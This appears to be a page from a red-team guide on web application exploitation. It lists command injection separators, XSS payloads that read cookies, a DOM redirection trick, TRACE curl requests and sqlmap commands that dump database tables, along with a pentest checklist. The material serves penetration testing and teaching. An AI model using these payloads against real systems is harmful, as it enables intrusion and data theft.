# Red Team

## Table of Contents
1. [Information Gathering](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md#information-gathering)
2. [Exploitation](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md#exploitation)
3. [Pentest Checklist](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md#pentest-checklist)


## Information Gathering
- **[Networks/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Networks/Web%20Application.md)**
- **[Reconnaissance/Active/Web Application](https://github.com/p-arrow/RedTeam-Guide/blob/main/1_Reconnaissance/Active/Web%20Application.md)**

<br />

## Exploitation

### 1) Command Injection

#### Command Injection into available input masks
- Sequential: `/bin/exploit ; malicious_code`
- Pipeline: `/bin/exploit | malicious_code` (use output of exploit as input for malicious_code)
- Substitution: `/bin/exploit 'malicious_code'` (output of malicious_code as arg to exploit)
- Substitution: `/bin/exploit $(malicious_code)` (output of malicious_code as arg to exploit)
- Redirection: `/bin/exploit > ~/.bashrc` (overwrite bashrc)

### 2) XSS
- [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
- [3_Exploitation/XSS.md](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/XSS.md)

#### Quick & Dirty:
     - `<script>alert("XSS LEAK")</script>`
     - `<script>alert(document.cookie)</script>`

#### DOM Based URL Redirection
- Look for `https://example.com/#dashboard`
- The value after `#` is accessible by Javascript
- Use `window.location.hash`
- If URL Redirection is in place you can test if a redirection to an external site is possible
- Enter `https://example.com/#www.externalsite.com`
- Activate the redirection via Javascript
- `window.location = window.location.hash.substr(1)`: use substr() to remove the '#'
- Following mitigations exist:
   - A) URL Whitelisting: `https://example.com/redirect?externalPage=1` or `https://example.com/redirect?page=dashboard`
   - B) REGEX

#### Web Server with TRACE/TRACK enabled (XST)
- Details: [https://owasp.org/Cross_Site_Tracing](https://owasp.org/www-community/attacks/Cross_Site_Tracing)
- "XST could be used as a method to steal user’s cookies via XSS"
- "This is possible even if the cookie has the “HttpOnly” flag set or exposes the user’s Authorization header"
- `curl -X TRACE www.example.org`
- `curl -X TRACE -H "Cookie: name=value" www.example.org`

### 3) SQLi

#### sqlmap
```
--> HTTP POST request: (after interception) save request to file (Burpsuite)
--> sqlmap -r request -p password (-p = analyze Parameter from POST method)
--> sqlmap -r request -D [database] --tables
--> sqlmap -r request -D [database] -T [table] --dump
--> -p "Parameter" -u "url" --tables
--> -p "Parameter" -D [DBMS] -T [Table] --dump -u "url"
```

<br />

## Pentest Checklist
Vulnerability | Test Method
------------- | -----------
Insufficient Cache Controls | Observe headers on pages containing sensitive data
Username Enumeration | Login valid user/invalid password – then compare. Login invalid user/invalid password – then compare
Session Cookies Not Marked Secure | Observe response headers after authentication
